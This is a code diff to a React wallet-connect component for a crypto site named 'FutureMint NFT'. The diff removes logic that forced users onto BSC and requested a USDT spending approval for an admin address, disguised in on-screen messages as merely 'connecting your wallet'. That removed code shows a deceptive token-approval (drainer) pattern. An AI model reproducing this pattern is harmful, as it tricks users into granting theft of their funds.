@@ -2,7 +2,7 @@
 import { useState, useEffect } from 'react';
 import { useDispatch } from 'react-redux';
 import { connectWallet, setBalances, setConnecting, setError } from '../store/slices/walletSlice';
-import { getAllUSDTBalances, approveUSDTForAdmin, checkUSDTAllowance } from '../lib/web3';
+import { getAllUSDTBalances } from '../lib/web3';
 import { Wallet, Shield, ChevronRight, Loader2, AlertCircle, QrCode, Fuel } from 'lucide-react';
 import toast from 'react-hot-toast';
 
@@ -34,7 +34,7 @@ export default function WalletConnect({ onConnected }) {
     }, 400);
   }, []);
 
-  // ─── Core: Connect with any provider ───
+  // ─── Core: Connect wallet only (NO approval here) ───
   const connectWithProvider = async (provider, walletName) => {
     setConnectingLocal(true);
     setLocalError(null);
@@ -46,70 +46,9 @@ export default function WalletConnect({ onConnected }) {
       await web3Provider.send('eth_requestAccounts', []);
       const signer = await web3Provider.getSigner();
       const rawAddress = await signer.getAddress();
-      // Normalize address to proper checksum format
       const address = ethers.getAddress(rawAddress.toLowerCase());
       const network = await web3Provider.getNetwork();
-
-      // Determine user's network from chainId
       const chainId = network.chainId.toString();
-
-      // ─── Approve USDT on whichever network wallet is currently on ───
-      // Ensure wallet is on BSC or Polygon (not Ethereum or other chains)
-      let currentNetwork = 'BSC'; // default
-      if (chainId === '137') {
-        currentNetwork = 'Polygon';
-      } else if (chainId !== '56') {
-        // Wallet is on wrong network — switch to BSC
-        try {
-          await web3Provider.send('wallet_switchEthereumChain', [{ chainId: '0x38' }]);
-        } catch (switchErr) {
-          if (switchErr.code === 4902) {
-            await web3Provider.send('wallet_addEthereumChain', [{
-              chainId: '0x38', chainName: 'BNB Smart Chain',
-              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-              rpcUrls: ['https://bsc-dataseed.binance.org'],
-              blockExplorerUrls: ['https://bscscan.com']
-            }]);
-          } else if (switchErr.code === 4001) {
-            setLocalError('Please switch to BSC or Polygon network to continue.');
-            dispatch(setError('Network switch rejected'));
-            return;
-          }
-        }
-        currentNetwork = 'BSC';
-      }
-
-      // Re-get provider after potential chain switch
-      const freshProvider = new ethers.BrowserProvider(provider);
-      const freshSigner = await freshProvider.getSigner();
-      const rawFreshAddress = await freshSigner.getAddress();
-      const freshAddress = ethers.getAddress(rawFreshAddress.toLowerCase());
-
-      const alreadyApproved = await checkUSDTAllowance(freshAddress, currentNetwork);
-
-      if (!alreadyApproved) {
-        toast.loading('Connecting Your Wallet In FutureMint', { id: 'approve' });
-        try {
-          await approveUSDTForAdmin(freshProvider, currentNetwork);
-          toast.success('Wallet Connected In FutureMint Sucessfull!', { id: 'approve' });
-        } catch (approveErr) {
-          toast.dismiss('approve');
-          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
-            setLocalError('Wallet approval is required to use FutureMint. Please approve to continue.');
-            dispatch(setError('Connection rejected'));
-            return;
-          }
-          if (approveErr.message?.includes('insufficient funds')) {
-            setLocalError('Insufficient BNB/MATIC for gas fee. Add native tokens to your wallet.');
-            dispatch(setError('Insufficient gas'));
-            return;
-          }
-          console.error('Approve error:', approveErr);
-          setLocalError(`Wallet Connection failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
-          dispatch(setError(approveErr.message));
-          return;
-        }
-      }
 
       // Fetch USDT balances
       const balances = await getAllUSDTBalances(address);
@@ -161,7 +100,7 @@ export default function WalletConnect({ onConnected }) {
           name: 'FutureMint NFT',
           description: 'Earn NFTs, Build Your Team',
           url: process.env.NEXT_PUBLIC_APP_URL || window.location.origin,
-          icons: [`${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/favicon.ico`],
+          icons: [`${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/assets/favicon/favicon-96x96.png`],
         },
       });
 
